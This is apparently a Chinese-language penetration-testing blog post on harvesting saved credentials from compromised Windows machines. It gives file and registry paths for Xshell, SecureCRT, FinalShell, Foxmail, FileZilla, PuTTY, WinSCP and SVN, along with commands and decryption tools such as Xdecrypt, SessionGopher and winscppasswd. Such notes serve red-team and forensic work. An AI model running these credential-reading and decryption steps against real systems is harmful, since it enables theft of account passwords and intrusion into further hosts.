# 内网渗透-Windows凭据收集之Xshell、SecureCRT等其他凭据(10)

  
  
&lt;!--more--&gt;  
## xshell  
XShell 5 `%userprofile%\Documents\NetSarang\Xshell\Sessions`  
XFTP 5 `%userprofile%\Documents\NetSarang\Xftp\Sessions`  
XShell 6 `%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions`  
XFTP 6 `%userprofile%\Documents\NetSarang Computer\6\Xftp\Sessions`  
5.x之后的版本，默认放在了当前用户的Documents目录下的NetSarang目录中  
```  
#dir&#34;%userprofile%\Documents\NetSarang\Xshell\Sessions&#34;  
#dir &#34;%userprofile%\Documents\NetSarang\Xftp\Sessions&#34;  
```  
6.x之后的版本，放在了当前用户的Documents目录下，目录改了名叫`NetSarang Computer`  
```  
#dir&#34;%userprofile%\Documents&#34;  
#dir&#34;%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions&#34;  
#dir&#34;%userprofile%\Documents\NetSarang Computer\6\Xftp\Sessions&#34;  
```  
https://github.com/dzxs/Xdecrypt  
```  
python Xdecrypt.py -s &#34;username&#34;&#43;&#34;S-1-5-21-3236955782-1939288761-1217588242-1001&#34; -p &#34;C:\Users\win10\Documents\NetSarang\Xshell\Sessions&#34;  
```  
## FinalShell  
尝试把`json`文件拿回来然后进去解密  
`C:\Users\win10\AppData\Local\finalshell\conn`  
https://github.com/passer-W/FinalShell-Decoder  
## SecureCRT  
在不同版本的SecureCRT中`%APPDATA%\VanDyke\Config\Sessions\example.com.ini`配置中对应的password可能是不一样的，有些密码存储在password项，有些存储的是`Password V2`项，具体类似如下  
```  
S:&#34;Password&#34;  
=u17cf50e394ecc2a06fa8919e1bd67cf0f37da34c78e7eb87a3a9a787a9785e802dd0eae4e8039c3ce234d34bfe28bbdc  
S:&#34;Password V2&#34;=02:7b9f594a1f39bb36bbaa0d9688ee38b3d233c67b338e20e2113f2ba4d328b6fc8c804e3c02324b1eaad57a5b96ac1fc5cc1ae0ee2930e6af2e5e644a28ebe3fc  
```  
这两者之间的加解密方法是有区别的。具体一般以SecureCRT 7.3.3版本进行分界。之前的版本一般会使用password加密算法，之后的一般使用password v2算法。  
**低版本**  
拿文件回来直接用脚本看  
https://github.com/gitPoc32/Forensic/tree/master/VanDykeSecureCRT  
`python2 SecureCRT-decryptpass.py 172.16.81.134.ini`  
**高版本**  
整个目录拷回来，直接连接  
对于高版本对，可以把`%APPDATA%\VanDyke\Config\`整个目录拷贝到本机SecureCRT的Config目录下，然后直接连接。但版本要与目标的一致，否则可能出问题。  
```  
找到目标securecrt保存在本地的所有连接会话文件，默认都存放在当前用户数据目录下的Config目录下的Sessions目录中,以.ini命名  
%APPDATA%\VanDyke\Config\Sessions  
C:\Users\win10\AppData\Roaming\VanDyke\Config\Sessions  
```  
**teamserver**  
https://github.com/Enul1ttle/Tools/tree/69c0552dfd47f2483782824d2e92c857978f4ed9  
**foxmail**  
```  
[Foxmail 7.2 版]  
C:\Program Files\Foxmail 7.2\Storage\&lt;account_emailaddress&gt;\Accounts\Account.rec0  
  
[Foxmail 7.0 版]  
C:\Program Files\Foxmail 7.0\Data\AccCfg\Accounts.tdat  
  
[Foxmail 6 版.x]  
C:\Program Files\Foxmail\mail\&lt;account_emailaddress&gt;\Account.stg  
```  
https://github.com/StarZHF/Foxmail-Password-Recovery  
**FileZilla**  
存放路径`C:\Users\win10\AppData\Roaming\FileZilla\recentservers.xml`  
base64解码即可  
**PuTTY**  
获取连接记录  
`HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\`  
https://www.sec-in.com/article/463  
**WinSCP**  
`reg query &#34;HKEY_USERS\S-1-5-21-3448889457-1595340786-1372807316-1000\Software\Martin Prikryl\WinSCP 2\Sessions&#34;`  
https://github.com/anoopengineer/winscppasswd  
`winscppasswd.exe 192.168.0.109 root pass`  
https://github.com/Arvanaghi/SessionGopher 提取WinSCP、PuTTY等保存的会话信息  
```  
. .\SessionGopher.ps1  
Invoke-SessionGopher -Thorough  
```  
**svn**  
`C:\Users\win10\AppData\Roaming\Subversion\auth\svn.simple`  
http://www.leapbeyond.com/ric/tsvnpd/ 或者 laZagne  

---

> Author: N1Rvana  
> URL: http://localhost:1313/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E5%87%AD%E6%8D%AE%E6%94%B6%E9%9B%86%E4%B9%8Bxshellsecurecrt%E7%AD%89%E5%85%B6%E4%BB%96%E5%87%AD%E6%8D%AE10/  

